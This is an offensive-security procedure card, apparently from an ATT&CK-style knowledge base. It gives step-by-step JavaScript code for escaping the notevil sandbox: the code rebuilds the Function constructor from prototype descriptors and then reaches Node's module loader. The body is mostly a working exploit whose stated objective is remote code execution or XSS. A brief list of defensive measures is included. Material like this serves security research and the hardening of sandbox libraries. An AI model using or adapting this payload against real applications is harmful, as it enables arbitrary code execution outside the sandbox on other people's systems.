---
id: proc-construct-payload
tags:
  - javascript
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Node.js
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:08.458Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Construct Malicious Payload for Sandbox Bypass

## Summary

This procedure builds a JavaScript payload that exploits the notevil sandbox by manipulating Object.getOwnPropertyDescriptors on function prototypes to reconstruct and invoke the Function constructor.

## Description

The payload creates a dummy function, extracts its prototype's constructor descriptors, removes unsafe properties, and binds them to create a callable Function that executes arbitrary code. In Node.js, it loads the util module; in browsers, it triggers alerts. This bypasses the fix in commit 5974329712f0a527c5e16d3b9067a076e28e45f1.

## Requirements

1. Knowledge of JavaScript prototypes and descriptors
2. Access to safeEval from notevil
3. Target environment (Node.js or browser)

## Defense

Defensive measures and detection strategies:

- Wrap prototypes more securely in sandbox libraries
- Detect descriptor manipulation via AST analysis
- Use Content Security Policy (CSP) in browsers

## Objectives

1. Create payload for RCE or XSS
2. Ensure compatibility across environments
3. Validate payload syntax

## Instructions

### Step 1: Define Dummy Function

**Context**: Create a function to access its prototype constructor.

**Command**:
```javascript
function fn() {};
```

> Dummy function for prototype access. Expected output: Function defined.

### Step 2: Extract and Manipulate Descriptors

**Context**: Get descriptors, filter unsafe properties, and bind for reconstruction.

**Command**:
```javascript
var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();
```

> Descriptors extracted and bound. Expected output: Func ready to invoke.

### Step 3: Invoke Reconstructed Function

**Context**: Call the payload to execute code.

**Command**:
```javascript
(Func())();
```

> Executes arbitrary code. Expected output: Code runs outside sandbox.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- javascript
- payload
